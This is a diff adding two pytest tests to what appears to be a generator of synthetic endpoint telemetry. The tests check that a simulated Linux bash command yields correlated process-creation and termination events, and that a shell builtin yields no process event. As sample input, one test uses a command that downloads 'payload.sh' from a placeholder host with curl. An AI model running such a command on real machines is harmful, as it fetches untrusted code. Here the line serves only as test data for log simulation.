@@ -2883,6 +2883,117 @@ class TestActivityGenerator:
         assert bash_events
         assert bash_events[-1].shell.command == "cat /etc/hosts"
 
+    def test_generate_bash_command_emits_correlated_linux_process(
+        self, activity_gen, test_user, state_manager, mock_emitters
+    ):
+        """Direct Linux shell history commands should have matching process telemetry."""
+        command_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        linux = System(
+            hostname="LNX-01",
+            ip="10.0.0.2",
+            os="Ubuntu 22.04",
+            type="server",
+            assigned_user=test_user.username,
+        )
+        logon_id = "0xabc123"
+        state_manager.set_current_time(command_time - timedelta(seconds=30))
+        systemd_pid = state_manager.create_process(
+            linux.hostname,
+            0,
+            "/usr/lib/systemd/systemd",
+            "/usr/lib/systemd/systemd --system",
+            "root",
+            "System",
+        )
+        sshd_pid = state_manager.create_process(
+            linux.hostname,
+            systemd_pid,
+            "/usr/sbin/sshd",
+            "/usr/sbin/sshd -D [listener]",
+            "root",
+            "System",
+        )
+        session = state_manager.register_session(
+            logon_id=logon_id,
+            username=test_user.username,
+            system=linux.hostname,
+            logon_type=10,
+            source_ip="10.0.0.50",
+            start_time=command_time - timedelta(seconds=20),
+        )
+        bash_pid = state_manager.create_process(
+            linux.hostname,
+            sshd_pid,
+            "/bin/bash",
+            "-bash",
+            test_user.username,
+            "Medium",
+            logon_id,
+        )
+        session.session_shell_pid = bash_pid
+        activity_gen._system_pids = {
+            linux.hostname: {"systemd": systemd_pid, "sshd": sshd_pid, "bash": bash_pid}
+        }
+
+        activity_gen.generate_bash_command(
+            test_user,
+            linux,
+            command_time,
+            "curl https://updates.example.com/payload.sh",
+        )
+
+        events = [
+            call.args[0] for call in mock_emitters["windows_event_security"].emit.call_args_list
+        ]
+        process_events = [
+            event
+            for event in events
+            if event.event_type == "process_create"
+            and event.process is not None
+            and event.process.command_line == "curl https://updates.example.com/payload.sh"
+        ]
+        assert process_events
+        assert process_events[-1].process.image == "/usr/bin/curl"
+        assert process_events[-1].process.parent_pid == bash_pid
+        terminate_events = [
+            event
+            for event in events
+            if event.event_type == "process_terminate"
+            and event.process is not None
+            and event.process.pid == process_events[-1].process.pid
+        ]
+        assert terminate_events
+        assert process_events[-1].timestamp < terminate_events[-1].timestamp
+
+    def test_generate_bash_command_does_not_emit_process_for_shell_builtin(
+        self, activity_gen, test_user, state_manager, mock_emitters
+    ):
+        """Shell builtins are valid bash history without standalone exec telemetry."""
+        command_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
+        linux = System(
+            hostname="LNX-01",
+            ip="10.0.0.2",
+            os="Ubuntu 22.04",
+            type="server",
+            assigned_user=test_user.username,
+        )
+        state_manager.register_session(
+            logon_id="0xabc123",
+            username=test_user.username,
+            system=linux.hostname,
+            logon_type=10,
+            source_ip="10.0.0.50",
+            start_time=command_time - timedelta(seconds=20),
+        )
+
+        activity_gen.generate_bash_command(test_user, linux, command_time, "cd /var/www/html")
+
+        events = [
+            call.args[0] for call in mock_emitters["windows_event_security"].emit.call_args_list
+        ]
+        assert any(event.event_type == "bash_command" for event in events)
+        assert not any(event.event_type == "process_create" for event in events)
+
     def test_generate_process_shifts_after_existing_session_start(
         self, activity_gen, test_user, test_system, state_manager, mock_emitters
     ):
